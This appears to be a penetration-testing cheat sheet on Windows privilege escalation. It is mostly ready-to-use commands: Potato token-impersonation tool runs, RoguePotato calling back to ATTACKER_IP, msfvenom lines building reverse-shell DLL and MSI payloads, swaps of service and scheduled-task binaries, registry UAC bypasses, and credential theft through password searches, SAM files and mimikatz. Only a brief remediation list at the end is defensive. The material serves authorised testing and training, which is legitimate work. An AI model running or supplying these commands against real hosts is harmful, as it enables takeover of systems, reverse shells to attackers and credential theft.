# Windows Privilege Escalation

Windows privilege escalation techniques exploit misconfigurations, vulnerable services, and insecure permissions to elevate access from a standard user to SYSTEM or Administrator on a Windows host.

## Initial Enumeration

```cmd
:: Current user and privileges
whoami
whoami /priv
whoami /groups
net user %username%

:: System information
systeminfo
hostname
wmic os get caption,version,buildnumber

:: Other users and groups
net user
net localgroup Administrators
qwinsta

:: Network information
ipconfig /all
route print
netstat -ano
arp -a

:: Running processes and services
tasklist /svc
wmic service list brief
sc queryex type=service state=all

:: Installed software
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

:: Automated enumeration
:: Upload and run: WinPEAS, PowerUp, Seatbelt, SharpUp
.\winPEASany.exe
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

## Token Impersonation (Potato Attacks)

Exploits `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (common on service accounts like IIS AppPool, SQL Server, MSSQL).

```cmd
:: Check for the privilege
whoami /priv
:: Look for: SeImpersonatePrivilege — Enabled
:: Look for: SeAssignPrimaryTokenPrivilege — Enabled
```

### JuicyPotato (Windows Server 2008-2016)

```cmd
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\reverse.exe" -t *
```

### PrintSpoofer (Windows 10 / Server 2016-2019)

```cmd
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "c:\temp\reverse.exe"
```

### GodPotato (Windows 2012-2022)

```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "c:\temp\reverse.exe"
```

### RoguePotato

```cmd
:: Requires a redirect listener on attacker machine (socat)
:: On attacker: socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999
.\RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd /c c:\temp\reverse.exe"
```

### SweetPotato

```cmd
.\SweetPotato.exe -p c:\temp\reverse.exe
```

## Service Misconfigurations

### Unquoted Service Paths

```cmd
:: Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: Example vulnerable path:
:: C:\Program Files\Vulnerable App\Service Binary\app.exe
:: Windows will try:
:: C:\Program.exe
:: C:\Program Files\Vulnerable.exe
:: C:\Program Files\Vulnerable App\Service.exe
:: C:\Program Files\Vulnerable App\Service Binary\app.exe

:: Place a malicious executable at one of these paths
copy c:\temp\reverse.exe "C:\Program Files\Vulnerable.exe"
sc stop VulnService
sc start VulnService
```

### Weak Service Permissions

```cmd
:: Check service permissions with accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *

:: If SERVICE_CHANGE_CONFIG is allowed:
sc config VulnService binpath= "c:\temp\reverse.exe"
sc stop VulnService
sc start VulnService

:: Reset after exploitation:
sc config VulnService binpath= "C:\original\path\service.exe"
```

### Writable Service Binary

```cmd
:: Check permissions on service binary
icacls "C:\path\to\service.exe"

:: If current user has write access:
move "C:\path\to\service.exe" "C:\path\to\service.exe.bak"
copy c:\temp\reverse.exe "C:\path\to\service.exe"
sc stop VulnService
sc start VulnService
```

## DLL Hijacking

```cmd
:: Find DLL search order hijacking opportunities
:: 1. Application directory
:: 2. System directory (C:\Windows\System32)
:: 3. Windows directory (C:\Windows)
:: 4. Current directory
:: 5. PATH directories

:: Use Process Monitor to identify missing DLLs:
:: Filter: Result is NAME NOT FOUND, Path ends with .dll

:: Create malicious DLL
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o hijacked.dll

:: Place DLL in writable location within search path
copy hijacked.dll "C:\writable\application\directory\missing.dll"
```

## AlwaysInstallElevated

```cmd
:: Check if enabled (both must be set to 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: If both are enabled, create malicious MSI
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi

:: Install with elevated privileges
msiexec /quiet /qn /i evil.msi
```

## UAC Bypass

```cmd
:: Check UAC settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

:: ConsentPromptBehaviorAdmin = 0 (no prompt)
:: EnableLUA = 0 (UAC disabled)

:: Fodhelper bypass (Windows 10)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "c:\temp\reverse.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
:: Clean up
reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f

:: ComputerDefaults bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
ComputerDefaults.exe

:: EventViewer bypass
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "cmd.exe" /f
eventvwr.exe
```

## Registry Autoruns

```cmd
:: Find writable autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Check permissions on autorun executables
icacls "C:\path\to\autorun.exe"

:: If writable, replace with malicious binary
:: Requires logout/login or reboot to trigger
```

## Scheduled Tasks

```cmd
:: List scheduled tasks
schtasks /query /fo TABLE /nh
schtasks /query /fo LIST /v

:: Find tasks running as SYSTEM with writable scripts
:: Check permissions on task executable
icacls "C:\path\to\scheduled\task.exe"

:: If writable, replace the binary
copy c:\temp\reverse.exe "C:\path\to\scheduled\task.exe"
```

## Credential Harvesting

```cmd
:: Saved credentials
cmdkey /list

:: If credentials exist, use runas
runas /savecred /user:Administrator cmd.exe

:: Search for passwords in files
findstr /si password *.txt *.ini *.config *.xml
findstr /spin "password" *.txt *.ini *.config *.xml *.ps1 *.bat

:: Registry password search
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

:: Unattended install files
type C:\unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\sysprep\sysprep.xml

:: SAM and SYSTEM backup files
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM

:: Dump with mimikatz (if admin)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

## Vulnerable Drivers

```cmd
:: List loaded drivers
driverquery /v

:: Check for known vulnerable drivers
:: Tools: LOLDrivers project — https://www.loldrivers.io/
:: Bring Your Own Vulnerable Driver (BYOVD) technique
```

## Remediation Checks

- Remove unnecessary privileges (SeImpersonatePrivilege) from service accounts
- Quote all service binary paths in the registry
- Set restrictive ACLs on service binaries and directories
- Disable AlwaysInstallElevated policy
- Keep systems patched to prevent kernel and driver exploits
- Enforce UAC at the highest setting
- Audit scheduled tasks and autorun entries for weak permissions
- Use Group Managed Service Accounts (gMSA) instead of static service credentials
